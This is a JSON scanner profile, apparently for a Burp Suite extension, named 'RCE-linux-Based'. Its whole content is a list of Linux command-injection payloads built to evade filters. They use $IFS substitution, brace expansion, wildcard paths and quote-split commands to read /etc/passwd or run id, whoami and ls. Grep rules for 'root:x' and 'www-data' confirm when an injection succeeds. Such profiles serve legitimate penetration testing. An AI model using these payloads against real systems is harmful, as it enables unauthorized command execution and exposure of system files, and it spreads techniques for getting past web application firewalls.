[
  {
    "ProfileName": "RCE-linux-Based",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@Sy3Omda",
    "Payloads": [
      "true,;cat /e${hahaha}tc/${heywaf}pas${catchthis}swd",
      "true,;cat$u /etc$u/passwd$u",
      "true,;{cat,/etc/passwd}",
      "true,;cat\u003c/etc/passwd",
      "true,;/???/??t /???/??ss??",
      "true,%0Acat%20/etc/passwd",
      "true,;cat$IFS/etc/passwd",
      "true,;echo${IFS}\"RCE\"${IFS}\u0026\u0026cat${IFS}/etc/passwd",
      "true,;who$@ami",
      "true,;w\\ho\\am\\i",
      "true,;w\"h\"o\"am\"i",
      "true,;w\u0027h\u0027o\u0027am\u0027i",
      "true,a;id;",
      "true,|/bin/ls -al",
      "true,a;/usr/bin/id;"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,root:x",
      "true,Or,www-data"
    ],
    "Tags": [
      "PathTraversal",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "RCE-linux-Based",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "Path traversal payload: \u003cbr\u003e \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]